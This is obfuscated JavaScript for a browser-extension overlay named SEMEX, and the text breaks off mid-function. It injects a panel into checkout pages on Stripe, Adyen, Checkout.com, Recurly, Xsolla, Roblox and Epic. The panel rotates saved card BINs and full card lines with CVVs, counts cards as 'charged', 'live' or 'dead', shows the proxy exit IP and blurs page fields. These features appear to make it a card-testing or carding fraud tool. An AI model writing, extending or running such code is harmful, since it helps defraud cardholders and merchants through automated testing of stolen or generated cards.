var __defProp = Object.defineProperty;
var __name = (_0x211fb2, _0xfe5f16) => __defProp(_0x211fb2, "name", {
  value: _0xfe5f16,
  configurable: true
});
(function () {
  if (window.SEMEX_OVERLAY_INJECTED) {
    return;
  }
  window.SEMEX_OVERLAY_INJECTED = true;
  const _0x3b42e1 = {
    positions: ["bl", "br", "tr", "tl"],
    defaultPosition: "bl",
    defaultState: "full",
    statsMode: "session",
    timing: {
      fieldDelay: 60,
      uiWait: 150,
      submitWait: 400,
      errorDelay: 200,
      statusTimeout: 120000
    }
  };
  let _0x5695ac = {
    position: _0x3b42e1.defaultPosition,
    viewState: _0x3b42e1.defaultState,
    statsMode: _0x3b42e1.statsMode,
    isRunning: false,
    isPaused: false,
    isBlurred: false,
    startTime: null,
    timerInterval: null,
    sessionStats: {
      total: 0,
      charged: 0,
      live: 0,
      dead: 0
    },
    currentCard: null,
    processedCount: 0
  };
  // ---- Bin library quick-switcher (checkout overlay) ----
  let _semexSavedBins = [];
  let _semexBinMenuOpen = false;
  let _semexBinsLoading = false;
  function _semexEsc(_0xraw) {
    return String(_0xraw == null ? "" : _0xraw).replace(/[&<>"']/g, _0xc => ({
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      "\"": "&quot;",
      "'": "&#39;"
    })[_0xc]);
  }
  __name(_semexEsc, "semexEsc");
  // Keep locally-added BINs across a refetch that raced the storage write —
  // otherwise a just-added BIN vanishes from the open menu until reload.
  function _semexKeepLocalBins(_0xlist) {
    const _0xprev = _semexSavedBins.filter(_0xb => _0xb && _0xb.local);
    const _0xnext = Array.isArray(_0xlist) ? _0xlist.slice() : [];
    for (const _0xl of _0xprev) {
      if (!_0xnext.some(_0xx => String(_0xx && _0xx.bin) === String(_0xl.bin))) _0xnext.unshift(_0xl);
    }
    return _0xnext;
  }
  __name(_semexKeepLocalBins, "semexKeepLocalBins");
  function _semexActiveBin() {
    try {
      const _0xb = (window.__extensionSettings || {}).binOrCCList || {};
      return _0xb.mode === "ccList" ? "" : String(_0xb.bin || "").trim();
    } catch (_0xe) {
      return "";
    }
  }
  __name(_semexActiveBin, "semexActiveBin");
  function _semexCcLines() {
    const _0xs = (window.__extensionSettings || {}).binOrCCList || {};
    return String(_0xs.ccList || "").split("\n").map(_0xx => _0xx.trim()).filter(_0xx => _0xx.replace(/\D/g, "").length >= 10);
  }
  __name(_semexCcLines, "semexCcLines");
  function _semexListMode() {
    const _0xs = (window.__extensionSettings || {}).binOrCCList || {};
    return _0xs.mode === "ccList" ? "ccList" : "bin";
  }
  __name(_semexListMode, "semexListMode");
  function _semexMaskCc(_0xline) {
    const _0xnum = String(_0xline).split("|")[0].replace(/\D/g, "");
    return _0xnum.length >= 10 ? _0xnum.slice(0, 6) + "\u2022\u2022\u2022\u2022" + _0xnum.slice(-4) : String(_0xline).slice(0, 16);
  }
  __name(_semexMaskCc, "semexMaskCc");
  function _semexSyncSeg() {
    const _0xm = _semexListMode();
    const _0xb = document.getElementById("segBinBtn"), _0xc = document.getElementById("segCcBtn");
    if (_0xb) _0xb.classList.toggle("on", _0xm === "bin");
    if (_0xc) _0xc.classList.toggle("on", _0xm === "ccList");
    const _0xin = document.getElementById("binAddInput");
    if (_0xin) _0xin.placeholder = _0xm === "ccList" ? "add new CC (num|mm|yy|cvv)" : "add new BIN (e.g. 424242)";
  }
  __name(_semexSyncSeg, "semexSyncSeg");
  function _semexSetListMode(_0xmode) {
    // Preflight: if the bridge is gone, show the reload prompt instead of
    // silently optimistic-updating without persisting the change.
    if (!_semexBridgeAlive()) {
      _0x2796fd("Extension reloaded \u2014 refresh page", "⚠️");
      setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 3000);
      return;
    }
    window.__extensionSettings = window.__extensionSettings || {};
    window.__extensionSettings.binOrCCList = window.__extensionSettings.binOrCCList || {};
    window.__extensionSettings.binOrCCList.mode = _0xmode;
    window.postMessage({ type: "SEMEX_SET_LIST_MODE", mode: _0xmode }, "*");
    _semexSyncSeg();
    _semexUpdateBinLabel();
    if (_semexBinMenuOpen) _semexRenderBinMenu();
  }
  __name(_semexSetListMode, "semexSetListMode");
  function _semexApplyCc(_0xline) {
    // Preflight: if the bridge is gone, show the reload prompt immediately.
    if (!_semexBridgeAlive()) {
      _0x2796fd("Extension reloaded \u2014 refresh page", "⚠️");
      setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 3000);
      return;
    }
    const _0xlines = _semexCcLines();
    const _0xi = _0xlines.indexOf(_0xline);
    if (_0xi > 0) {
      // Existing card not already at the top — move it to the front.
      _0xlines.splice(_0xi, 1);
      _0xlines.unshift(_0xline);
    } else if (_0xi === -1) {
      // Brand-new card — prepend it so add-new CC lands at top of the list.
      _0xlines.unshift(_0xline);
    }
    // _0xi === 0: already at top, no reorder needed.
    window.__extensionSettings = window.__extensionSettings || {};
    window.__extensionSettings.binOrCCList = window.__extensionSettings.binOrCCList || {};
    window.__extensionSettings.binOrCCList.mode = "ccList";
    window.__extensionSettings.binOrCCList.ccList = _0xlines.join("\n");
    window.postMessage({ type: "SEMEX_SET_CC_ACTIVE", ccList: _0xlines.join("\n") }, "*");
    _semexUpdateBinLabel();
    _semexCloseBinMenu();
    const _0xbtn = document.getElementById("binSwitchBtn");
    if (_0xbtn) {
      _0xbtn.classList.add("flash");
      setTimeout(() => { try { _0xbtn.classList.remove("flash"); } catch (_0xe) {} }, 900);
    }
  }
  __name(_semexApplyCc, "semexApplyCc");
  async function _semexCycleItem() {
    if (_semexListMode() === "ccList") {
      const _0xlines = _semexCcLines();
      if (_0xlines.length < 2) {
        // Flash brief feedback instead of silently doing nothing.
        _0x2796fd(_0xlines.length === 0 ? "No cards left!" : "Only one card", "⚠️");
        setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 2000);
        return;
      }
      _0xlines.push(_0xlines.shift());
      _semexApplyCc(_0xlines[0]);
      return;
    }
    if (!_semexSavedBins.length) {
      // Show loading feedback immediately so the button never silently swallows
      // the tap while the network fetch is in-flight.
      _0x2796fd("Loading BINs\u2026", "⏳");
      const _0xres = await _semexFetchSavedBins();
      if (_0xres && !_0xres.ok && _0xres.error === "context_invalidated") {
        _0x2796fd("Extension reloaded \u2014 refresh page", "⚠️");
        setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 3000);
        return;
      }
      if (_0xres && !_0xres.ok) {
        // timeout, not_authenticated, or any other failure → clear error flash.
        _0x2796fd("BINs unavailable", "⚠️");
        setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 2500);
        return;
      }
      _semexSavedBins = _semexKeepLocalBins(_0xres && _0xres.ok && Array.isArray(_0xres.bins) ? _0xres.bins : []);
    }
    if (_semexSavedBins.length < 2) {
      // Flash brief feedback instead of silently doing nothing.
      _0x2796fd(_semexSavedBins.length === 0 ? "No BINs saved!" : "Only one BIN", "⚠️");
      setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 2000);
      return;
    }
    const _0xact = _semexActiveBin();
    const _0xi = _semexSavedBins.findIndex(_0xx => String(_0xx.bin) === _0xact);
    const _0xnext = _semexSavedBins[(_0xi + 1) % _semexSavedBins.length];
    if (_0xnext) _semexApplyBin(_0xnext);
  }
  __name(_semexCycleItem, "semexCycleItem");
  function _semexAddNewItem() {
    const _0xin = document.getElementById("binAddInput");
    if (!_0xin) return;
    const _0xv = _0xin.value.trim();
    if (!_0xv) return;
    if (_semexListMode() === "ccList") {
      if (_0xv.replace(/\D/g, "").length < 10) return;
      _semexApplyCc(_0xv);
    } else {
      const _0xbin = _0xv.replace(/\D/g, "").slice(0, 8);
      if (_0xbin.length < 6) return;
      _semexApplyBin({ bin: _0xbin });
      // Local-only "use now" (owner rule): never uploaded to the account —
      // named database saves live in the dashboard. Persistence to the
      // on-device list is handled by the isolated content script's trusted-
      // gesture listener on this control (page JS cannot forge it); here we
      // only reflect the add in the menu immediately.
      if (!_semexSavedBins.some(_0xx => String(_0xx && _0xx.bin) === _0xbin)) _semexSavedBins.unshift({ bin: _0xbin, local: true });
      if (_semexBinMenuOpen) _semexRenderBinMenu();
    }
    _0xin.value = "";
  }
  __name(_semexAddNewItem, "semexAddNewItem");
  function _semexUpdateBinLabel() {
    const _0xlbl = document.getElementById("binSwitchLabel");
    if (_0xlbl) {
      if (_semexListMode() === "ccList") {
        const _0xlines = _semexCcLines();
        _0xlbl.textContent = _0xlines.length ? _semexMaskCc(_0xlines[0]) : "Select CC";
      } else {
        const _0xbin = _semexActiveBin();
        _0xlbl.textContent = _0xbin ? _0xbin : "Select BIN";
      }
    }
    const _0xmenu = document.getElementById("binSwitchMenu");
    if (_0xmenu) {
      const _0xact = _semexActiveBin();
      _0xmenu.querySelectorAll(".binswitch-item").forEach(_0xel => {
        _0xel.classList.toggle("active", _0xel.getAttribute("data-bin") === _0xact);
      });
    }
  }
  __name(_semexUpdateBinLabel, "semexUpdateBinLabel");
  function _semexBinBrandIco(_0xb) {
    const _0xbrand = String((_0xb && _0xb.brand) || "").toLowerCase();
    if (_0xbrand.indexOf("visa") !== -1) return "\uD83D\uDCA0";
    if (_0xbrand.indexOf("master") !== -1) return "\uD83D\uDD34";
    if (_0xbrand.indexOf("amex") !== -1 || _0xbrand.indexOf("express") !== -1) return "\uD83D\uDFE6";
    if (_0xbrand.indexOf("disc") !== -1) return "\uD83D\uDFE7";
    return "\uD83D\uDCB3";
  }
  __name(_semexBinBrandIco, "semexBinBrandIco");
  // Helper: read the bridge heartbeat timestamp written by content.js into the
  // shared DOM (isolated-world → DOM is visible to MAIN-world scripts).
  function _semexBridgeTs() {
    try {
      return document.documentElement.getAttribute("data-semex-bridge") || "";
    } catch (_0xe) { return ""; }
  }
  function _semexBridgeAlive() {
    // The bridge writes either a numeric timestamp (alive) or the literal
    // string "invalidated" (chrome API context dead). A stale/absent value
    // also means the bridge is gone.
    const _0xraw = _semexBridgeTs();
    if (!_0xraw || _0xraw === "invalidated") return false;
    const _0xn = parseInt(_0xraw, 10);
    return _0xn > 0 && (Date.now() - _0xn) < 2000;
  }
  function _semexFetchSavedBins() {
    // Fast-path: if the content-script bridge heartbeat is stale or absent,
    // the isolated world is gone and no SEMEX_SAVED_BINS_RESULT will arrive.
    // Resolve immediately rather than hanging for 8 s.
    if (!_semexBridgeAlive()) {
      return Promise.resolve({ ok: false, bins: [], error: "context_invalidated" });
    }
    return new Promise(_0xresolve => {
      let _0xdone = false;
      function _0xonMsg(_0xev) {
        if (_0xev.source === window && _0xev.data && _0xev.data.type === "SEMEX_SAVED_BINS_RESULT") {
          _0xdone = true;
          clearInterval(_0xctxPoll);
          window.removeEventListener("message", _0xonMsg);
          // Normalize any bridge-side "Extension context invalidated" error
          // string to the canonical token the overlay checks against.
          const _0xresult = _0xev.data;
          if (!_0xresult.ok && _0xresult.error && typeof _0xresult.error === "string" &&
              _0xresult.error.toLowerCase().indexOf("invalidated") !== -1) {
            _0xresolve({ ok: false, bins: [], error: "context_invalidated" });
          } else {
            _0xresolve(_0xresult);
          }
        }
      }
      window.addEventListener("message", _0xonMsg);
      window.postMessage({ type: "SEMEX_GET_SAVED_BINS" }, "*");
      // Poll every 200 ms: if the heartbeat goes stale mid-flight (bridge torn
      // down while we were waiting), abort early instead of hanging 8 s.
      const _0xctxPoll = setInterval(() => {
        if (!_semexBridgeAlive()) {
          clearInterval(_0xctxPoll);
          if (!_0xdone) {
            _0xdone = true;
            window.removeEventListener("message", _0xonMsg);
            _0xresolve({ ok: false, bins: [], error: "context_invalidated" });
          }
        }
      }, 200);
      setTimeout(() => {
        clearInterval(_0xctxPoll);
        if (!_0xdone) {
          window.removeEventListener("message", _0xonMsg);
          _0xresolve({ ok: false, bins: [], error: "timeout" });
        }
      }, 8000);
    });
  }
  __name(_semexFetchSavedBins, "semexFetchSavedBins");
  function _semexRenderBinMenu() {
    const _0xmenu = document.getElementById("binSwitchMenu");
    if (!_0xmenu) return;
    // v4.0: CC mode lists the local card library (masked), no server fetch.
    if (_semexListMode() === "ccList") {
      const _0xlines = _semexCcLines();
      if (!_0xlines.length) {
        _0xmenu.innerHTML = "<div class=\"binswitch-empty\">No saved cards yet.<br>Add one below.</div>";
        return;
      }
      _0xmenu.innerHTML = _0xlines.map((_0xl, _0xi) => {
        return "<button class=\"binswitch-item" + (_0xi === 0 ? " active" : "") + "\" data-cc=\"" + _0xi + "\"><span class=\"binswitch-item-ico\">\uD83D\uDCB3</span><span class=\"binswitch-item-main\"><span class=\"binswitch-item-code\">" + _semexMaskCc(_0xl) + "</span></span></button>";
      }).join("");
      _0xmenu.querySelectorAll(".binswitch-item").forEach(_0xel => {
        _0xel.addEventListener("click", _0xe => {
          _0xe.stopPropagation();
          const _0xl2 = _0xlines[Number(_0xel.getAttribute("data-cc"))];
          if (_0xl2) _semexApplyCc(_0xl2);
        });
      });
      return;
    }
    if (_semexBinsLoading) {
      _0xmenu.innerHTML = "<div class=\"binswitch-empty\">Loading your BINs\u2026</div>";
      return;
    }
    if (!_semexSavedBins.length) {
      _0xmenu.innerHTML = "<div class=\"binswitch-empty\">No saved BINs yet.<br>Type one below to use it now.</div>";
      return;
    }
    const _0xact = _semexActiveBin();
    _0xmenu.innerHTML = _semexSavedBins.map(_0xb => {
      const _0xbin = _semexEsc(_0xb.bin);
      const _0xlabel = _0xb.label ? _semexEsc(_0xb.label) : "";
      const _0xtags = [];
      if (_0xb.brand) _0xtags.push(_semexEsc(String(_0xb.brand).toUpperCase()));
      if (_0xb.cardType) _0xtags.push(_semexEsc(String(_0xb.cardType).toUpperCase()));
      if (_0xb.countryCode) _0xtags.push(_semexEsc(String(_0xb.countryCode).toUpperCase()));
      if (_0xb.local) _0xtags.push("LOCAL");
      return "<button class=\"binswitch-item" + (String(_0xb.bin) === _0xact ? " active" : "") + "\" data-bin=\"" + _0xbin + "\"><span class=\"binswitch-item-ico\">" + _semexBinBrandIco(_0xb) + "</span><span class=\"binswitch-item-main\"><span class=\"binswitch-item-code\">" + _0xbin + "</span>" + (_0xlabel ? "<span class=\"binswitch-item-name\">" + _0xlabel + "</span>" : "") + "</span>" + (_0xtags.length ? "<span class=\"binswitch-item-tags\">" + _0xtags.join(" \u00B7 ") + "</span>" : "") + "</button>";
    }).join("");
    _0xmenu.querySelectorAll(".binswitch-item").forEach(_0xel => {
      _0xel.addEventListener("click", _0xe => {
        _0xe.stopPropagation();
        const _0xbinv = _0xel.getAttribute("data-bin");
        const _0xb = _semexSavedBins.find(_0xx => String(_0xx.bin) === String(_0xbinv));
        if (_0xb) _semexApplyBin(_0xb);
      });
    });
  }
  __name(_semexRenderBinMenu, "semexRenderBinMenu");
  function _semexCloseBinMenu() {
    _semexBinMenuOpen = false;
    const _0xmenu = document.getElementById("binSwitchMenu");
    const _0xbtn = document.getElementById("binSwitchBtn");
    if (_0xmenu) _0xmenu.classList.remove("open");
    if (_0xbtn) _0xbtn.classList.remove("open");
  }
  __name(_semexCloseBinMenu, "semexCloseBinMenu");
  async function _semexToggleBinMenu() {
    const _0xmenu = document.getElementById("binSwitchMenu");
    const _0xbtn = document.getElementById("binSwitchBtn");
    if (!_0xmenu || !_0xbtn) return;
    if (_semexBinMenuOpen) {
      _semexCloseBinMenu();
      return;
    }
    _semexBinMenuOpen = true;
    _0xmenu.classList.add("open");
    _0xbtn.classList.add("open");
    _semexBinsLoading = true;
    _semexRenderBinMenu();
    const _0xres = await _semexFetchSavedBins();
    _semexBinsLoading = false;
    if (!_semexBinMenuOpen) return;
    if (_0xres && !_0xres.ok && _0xres.error === "not_authenticated") {
      _0xmenu.innerHTML = "<div class=\"binswitch-empty\">Sign in to load your BINs.</div>";
      return;
    }
    if (_0xres && !_0xres.ok && _0xres.error === "context_invalidated") {
      // Extension context is permanently gone for this page load — reopening
      // the menu cannot reconnect the bridge. Instruct the user to refresh.
      _0xmenu.innerHTML = "<div class=\"binswitch-empty\">Extension reloaded \u2014 <strong>refresh this page</strong> to reconnect.</div>";
      return;
    }
    if (_0xres && !_0xres.ok && _0xres.error === "timeout") {
      _0xmenu.innerHTML = "<div class=\"binswitch-empty\" id=\"binMenuTimeout\" style=\"cursor:pointer\">BIN load timed out \u2014 tap to retry.</div>";
      const _0xretry2 = _0xmenu.querySelector("#binMenuTimeout");
      if (_0xretry2) _0xretry2.addEventListener("click", (_0xe) => { _0xe.stopPropagation(); _semexCloseBinMenu(); setTimeout(_semexToggleBinMenu, 50); });
      return;
    }
    _semexSavedBins = _semexKeepLocalBins(_0xres && _0xres.ok && Array.isArray(_0xres.bins) ? _0xres.bins : []);
    _semexRenderBinMenu();
  }
  __name(_semexToggleBinMenu, "semexToggleBinMenu");
  function _semexApplyBin(_0xb) {
    if (!_0xb || !_0xb.bin) return;
    // Preflight: if the bridge is gone, show the reload prompt immediately.
    if (!_semexBridgeAlive()) {
      _0x2796fd("Extension reloaded \u2014 refresh page", "⚠️");
      setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 3000);
      return;
    }
    window.__extensionSettings = window.__extensionSettings || {};
    window.__extensionSettings.binOrCCList = window.__extensionSettings.binOrCCList || {};
    window.__extensionSettings.binOrCCList.mode = "bin";
    window.__extensionSettings.binOrCCList.bin = String(_0xb.bin);
    if (_0xb.cvv) window.__extensionSettings.binOrCCList.cvv = String(_0xb.cvv);
    window.postMessage({
      type: "SEMEX_SET_ACTIVE_BIN",
      bin: String(_0xb.bin),
      cvv: _0xb.cvv || "",
      expiry: _0xb.expiry || ""
    }, "*");
    _semexUpdateBinLabel();
    _semexCloseBinMenu();
    const _0xbtn = document.getElementById("binSwitchBtn");
    if (_0xbtn) {
      _0xbtn.classList.add("flash");
      setTimeout(() => {
        try {
          _0xbtn.classList.remove("flash");
        } catch (_0xe) {}
      }, 900);
    }
  }
  __name(_semexApplyBin, "semexApplyBin");
  function _semexEnsureBinSwitcher() {
    const _0xoverlay = document.getElementById("semex-overlay");
    if (!_0xoverlay || _0xoverlay.querySelector("#binSwitchBtn")) return;
    const _0xbody = _0xoverlay.querySelector(".full-body");
    if (!_0xbody) return;
    const _0xctrls = _0xbody.querySelector(".full-controls");
    const _0xwrap = document.createElement("div");
    _0xwrap.className = "full-binswitch";
    // v4.0: segmented BIN/CC mode toggle + cycle button + inline add-new,
    // all on the overlay — no dashboard trip (user-approved compact v2 spec).
    _0xwrap.innerHTML = "<div class=\"binswitch-seg\"><button class=\"seg-btn\" id=\"segBinBtn\" title=\"BIN mode\">BIN</button><button class=\"seg-btn\" id=\"segCcBtn\" title=\"CC mode\">CC</button></div><div class=\"binswitch-row\"><button class=\"binswitch-btn\" id=\"binSwitchBtn\" title=\"Switch active BIN / CC\"><span class=\"binswitch-ico\">💳</span><span class=\"binswitch-label\" id=\"binSwitchLabel\">Select BIN</span><span class=\"binswitch-caret\">▾</span></button><button class=\"binswitch-cyc\" id=\"binCycleBtn\" title=\"Switch to next\">⇄</button></div><div class=\"binswitch-add\"><input id=\"binAddInput\" placeholder=\"add new BIN (e.g. 424242)\" maxlength=\"40\" autocomplete=\"off\"><button id=\"binAddBtn\" title=\"Add\">＋</button></div><div class=\"binswitch-menu\" id=\"binSwitchMenu\"></div>";
    if (_0xctrls) {
      _0xbody.insertBefore(_0xwrap, _0xctrls);
    } else {
      _0xbody.appendChild(_0xwrap);
    }
    // Layout order (owner request): status → stats → BIN/CC switcher (middle)
    // → controls → checkout details pinned to the bottom.
    try {
      const _0xdetMv = _0xbody.querySelector(".full-details");
      if (_0xdetMv) _0xbody.appendChild(_0xdetMv);
    } catch (_0xmvErr) {}
    const _0xbtn = _0xwrap.querySelector("#binSwitchBtn");
    if (_0xbtn) {
      _0xbtn.addEventListener("click", _0xe => {
        _0xe.stopPropagation();
        _semexToggleBinMenu();
      });
    }
    const _0xsegB = _0xwrap.querySelector("#segBinBtn");
    if (_0xsegB) _0xsegB.addEventListener("click", _0xe => { _0xe.stopPropagation(); _semexSetListMode("bin"); });
    const _0xsegC = _0xwrap.querySelector("#segCcBtn");
    if (_0xsegC) _0xsegC.addEventListener("click", _0xe => { _0xe.stopPropagation(); _semexSetListMode("ccList"); });
    const _0xcyc = _0xwrap.querySelector("#binCycleBtn");
    if (_0xcyc) _0xcyc.addEventListener("click", _0xe => { _0xe.stopPropagation(); _semexCycleItem(); });
    const _0xaddB = _0xwrap.querySelector("#binAddBtn");
    if (_0xaddB) _0xaddB.addEventListener("click", _0xe => { _0xe.stopPropagation(); _semexAddNewItem(); });
    const _0xaddI = _0xwrap.querySelector("#binAddInput");
    if (_0xaddI) _0xaddI.addEventListener("keydown", _0xe => { if (_0xe.key === "Enter") { _0xe.stopPropagation(); _semexAddNewItem(); } });
    _semexSyncSeg();
    if (!window.__semexBinClickAway) {
      window.__semexBinClickAway = true;
      document.addEventListener("click", _0xe => {
        if (!_semexBinMenuOpen) return;
        const _0xin = _0xe.target && _0xe.target.closest ? _0xe.target.closest(".full-binswitch") : null;
        if (!_0xin) _semexCloseBinMenu();
      });
    }
    _semexUpdateBinLabel();
  }
  __name(_semexEnsureBinSwitcher, "semexEnsureBinSwitcher");
  // ---- BIN detail: look up brand/type/bank/country for the live card ----
  let _semexLastBin6 = "";
  function _semexLookupBin(_0xcardNum) {
    const _0xnum = String(_0xcardNum || "").replace(/\D/g, "");
    const _0xbin6 = _0xnum.slice(0, 8);
    if (_0xbin6.length < 6 || _0xbin6 === _semexLastBin6) return;
    _semexLastBin6 = _0xbin6;
    window.postMessage({ type: "SEMEX_GET_BIN_INFO", bin6: _0xbin6 }, "*");
  }
  __name(_semexLookupBin, "semexLookupBin");
  function _semexUpdateBinInfo(_0xd) {
    const _0xrow = document.getElementById("detailBinRow");
    const _0xel = document.getElementById("detailBinInfo");
    if (!_0xrow || !_0xel) return;
    if (!_0xd || !_0xd.ok) { _0xrow.style.display = "none"; return; }
    const _0xparts = [];
    if (_0xd.brand) _0xparts.push(String(_0xd.brand).toUpperCase());
    if (_0xd.cardType) _0xparts.push(String(_0xd.cardType).toUpperCase());
    if (_0xd.countryCode) _0xparts.push(_semexEsc(String(_0xd.countryCode).toUpperCase()));
    if (_0xd.bank) _0xparts.push(_semexEsc(String(_0xd.bank).trim().slice(0, 26)));
    _0xel.textContent = _0xparts.join(" · ") || "-";
    _0xrow.style.display = "";
  }
  __name(_semexUpdateBinInfo, "semexUpdateBinInfo");
  // ---- Proxy exit IP display ----
  function _semexFetchIp() {
    window.postMessage({ type: "SEMEX_GET_IP" }, "*");
  }
  __name(_semexFetchIp, "semexFetchIp");
  function _semexUpdateIp(_0xd) {
    const _0xrow = document.getElementById("detailIpRow");
    const _0xel = document.getElementById("detailIp");
    if (!_0xrow || !_0xel) return;
    if (!_0xd || !_0xd.ok || !_0xd.ip) { _0xrow.style.display = "none"; return; }
    const _0xcc = _0xd.countryCode ? " · " + _semexEsc(String(_0xd.countryCode).toUpperCase()) : "";
    const _0xlat = _0xd.latency ? " (" + _0xd.latency + "ms)" : "";
    _0xel.textContent = _0xd.ip + _0xcc + _0xlat;
    _0xrow.style.display = "";
  }
  __name(_semexUpdateIp, "semexUpdateIp");
  // ---- Gateway + checkout type detection (Stripe / Adyen / Checkout.com / Recurly / Xsolla) ----
  function _semexGatewayKey() {
    const _h = (window.location.hostname || "").toLowerCase();
    if (_h.includes("stripe.com") || _h === "pay.openai.com") return "stripe";
    if (_h.includes("adyen.com") || _h.includes("checkoutshopper")) return "adyen";
    if (_h.includes("checkout.com")) return "checkout";
    if (_h.includes("recurly.com")) return "recurly";
    if (_h.includes("xsolla.com") || _h.includes("roblox.com") || _h.includes("epicgames.com")) return "xsolla";
    return null;
  }
  __name(_semexGatewayKey, "semexGatewayKey");
  // Is this non-Stripe page an actual payment/checkout page? Keeps the overlay
  // off gateway homepages (e.g. roblox.com marketing pages) while still showing
  // on their checkout flows.
  function _semexIsGatewayCheckoutPage() {
    const _h = (window.location.hostname || "").toLowerCase();
    const _p = (window.location.pathname || "").toLowerCase();
    if (!_semexGatewayKey() || _semexGatewayKey() === "stripe") return false;
    if (_h.includes("checkoutshopper")) return true; // Adyen hosted payment pages
    const _payish = /\/(c\/pay|pay|checkout|payment|purchase|buy|subscribe|subscription|hpp|paystation)/.test(_p);
    if (_h.includes("adyen.com")) return _payish;
    if (_h.includes("checkout.com")) return _h.startsWith("pay.") || _payish;
    if (_h.includes("recurly.com")) return _payish;
    if (_h.includes("xsolla.com")) return _h.startsWith("secure.") || _h.startsWith("pay.") || _payish;
    if (_h.includes("roblox.com")) return /\/(upgrades|payment|purchase|transactions|premium)/.test(_p);
    if (_h.includes("epicgames.com")) return _payish;
    return false;
  }
  __name(_semexIsGatewayCheckoutPage, "semexIsGatewayCheckoutPage");
  function _semexCheckoutType() {
    const _h = (window.location.hostname || "").toLowerCase();
    const _gw = _semexGatewayKey();
    if (_gw === "adyen") return "ADYEN";
    if (_gw === "checkout") return "CHECKOUT.COM";
    if (_gw === "recurly") return "RECURLY";
    if (_gw === "xsolla") {
      if (_h.includes("roblox.com")) return "ROBLOX";
      if (_h.includes("epicgames.com")) return "EPIC";
      return "XSOLLA";
    }
    if (_h === "invoice.stripe.com") return "INVOICE";
    if (_h === "billing.stripe.com") return "BILLING";
    if (_h === "pay.stripe.com" || _h === "buy.stripe.com" || _h === "donate.stripe.com") return "PAY LINK";
    return "CHECKOUT"; // checkout.stripe.com / pay.openai.com
  }
  __name(_semexCheckoutType, "semexCheckoutType");
  // ---- Inject BIN + IP detail rows into the overlay DOM (called once after createSemexOverlay) ----
  function _semexEnsureDetailRows() {
    const _0xdet = document.querySelector("#semex-overlay .full-details");
    if (!_0xdet || _0xdet.querySelector("#detailBinRow")) return;
    // Type row — always visible, shows which checkout variant this page is
    const _0xtypeRow = document.createElement("div");
    _0xtypeRow.className = "detail-row";
    _0xtypeRow.id = "detailTypeRow";
    _0xtypeRow.innerHTML = "<span>Type:</span><span class=\"detail-val semex-type-badge\" id=\"detailType\">" + _semexCheckoutType() + "</span>";
    const _0xfirstRow = _0xdet.querySelector(".detail-row");
    if (_0xfirstRow) {
      _0xdet.insertBefore(_0xtypeRow, _0xfirstRow);
    } else {
      _0xdet.appendChild(_0xtypeRow);
    }
    // BIN row — inserted right after the Card row
    const _0xbinRow = document.createElement("div");
    _0xbinRow.className = "detail-row";
    _0xbinRow.id = "detailBinRow";
    _0xbinRow.style.display = "none";
    _0xbinRow.innerHTML = "<span>BIN:</span><span class=\"detail-val\" id=\"detailBinInfo\">-</span>";
    const _0xcardRow = _0xdet.querySelector(".detail-row");
    if (_0xcardRow && _0xcardRow.nextSibling) {
      _0xdet.insertBefore(_0xbinRow, _0xcardRow.nextSibling);
    } else {
      _0xdet.appendChild(_0xbinRow);
    }
    // IP row — appended at the bottom of details
    const _0xipRow = document.createElement("div");
    _0xipRow.className = "detail-row";
    _0xipRow.id = "detailIpRow";
    _0xipRow.style.display = "none";
    _0xipRow.innerHTML = "<span>IP:</span><span class=\"detail-val\" id=\"detailIp\">-</span>";
    _0xdet.appendChild(_0xipRow);
  }
  __name(_semexEnsureDetailRows, "semexEnsureDetailRows");
  let _0x1ff268 = null;
  let _0x37b373 = null;
  function _0x12278d() {
    try {
      if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getURL) {
        return chrome.runtime.getURL("icons/logo.png");
      }
    } catch (_0x3def22) {}
    // MAIN world has no chrome.* APIs. Prefer the URL handed over the bridge
    // by content.js (SEMEX_LOGO_URL); fall back to a validated origin derived
    // from any injected chrome-extension:// resource in the DOM.
    if (_0x5695ac.logoUrl) {
      return _0x5695ac.logoUrl;
    }
    try {
      const _0xres = document.querySelector('link[href^="chrome-extension://"], script[src^="chrome-extension://"]');
      const _0xu = _0xres && (_0xres.href || _0xres.src);
      const _0xm = _0xu && _0xu.match(/^chrome-extension:\/\/[a-z]+\//);
      if (_0xm) {
        return _0xm[0] + "icons/logo.png";
      }
    } catch (_0xder) {}
    return "";
  }
  __name(_0x12278d, "getLogoUrl");
  function _0xapplyLogo(_0xurl) {
    if (!_0xurl) {
      return;
    }
    const _0xroot = document.getElementById("semex-overlay");
    if (!_0xroot) {
      return;
    }
    _0xroot.querySelectorAll(".pill-logo, .full-brand-logo, .dock-logo").forEach(_0xbox => {
      _0xbox.innerHTML = "";
      const _0ximg = document.createElement("img");
      _0ximg.src = _0xurl;
      _0ximg.alt = "SEMEX";
      _0xbox.appendChild(_0ximg);
    });
  }
  __name(_0xapplyLogo, "applyLogoImages");
  function _0x27ae9(_0x3573be) {
    window.postMessage({
      type: "SEMEX_TOGGLE_BLUR_STYLES",
      enabled: _0x3573be
    }, "*");
  }
  __name(_0x27ae9, "blurSensitivePageFields");
  function _0x1e815c() {
    // Adopt the extension-owned root pre-created by the document_start
    // bootstrap (the isolated world retains this exact node reference for
    // gesture provenance). It sits ahead of any page-planted lookalike in
    // document order; fall back to a fresh node only if it was wiped.
    const _0x335b44 = document.getElementById("semex-overlay");
    const _0x4fac23 = _0x335b44 || document.createElement("div");
    if (_0x335b44) {
      _0x335b44.innerHTML = "";
      _0x335b44.style.display = "";
    }
    _0x4fac23.id = "semex-overlay";
    // Marks a POPULATED overlay — content.js dedup logic must not treat the
    // bootstrap's hidden empty root as a live overlay.
    _0x4fac23.setAttribute("data-semex-live", "1");
    _0x4fac23.className = "state-" + _0x5695ac.viewState + " pos-" + _0x5695ac.position;
